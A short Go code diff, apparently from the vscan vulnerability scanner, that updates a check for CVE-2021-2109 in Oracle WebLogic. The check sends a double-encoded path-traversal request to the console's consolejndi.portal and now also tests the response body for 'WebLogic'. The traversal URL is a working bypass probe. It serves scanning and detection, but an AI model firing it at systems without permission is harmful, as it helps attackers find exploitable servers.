@@ -2,12 +2,13 @@ package weblogic
 
 import (
 	"fmt"
-	"github.com/veo/vscan/poc"
+	"github.com/veo/vscan/pkg"
+	"strings"
 )
 
 func CVE_2021_2109(url string) bool {
-	if req, err := poc.HttpRequset(url+"/console/css/%252e%252e%252f/consolejndi.portal", "GET", ""); err == nil {
-		if req.StatusCode == 200 {
+	if req, err := pkg.HttpRequset(url+"/console/css/%252e%252e%252f/consolejndi.portal", "GET", "", false, nil); err == nil {
+		if req.StatusCode == 200 && strings.Contains(req.Body, "WebLogic") {
 			fmt.Printf("weblogic-exp-sucess|CVE_2021_2109|%s\n", url)
 			return true
 		}
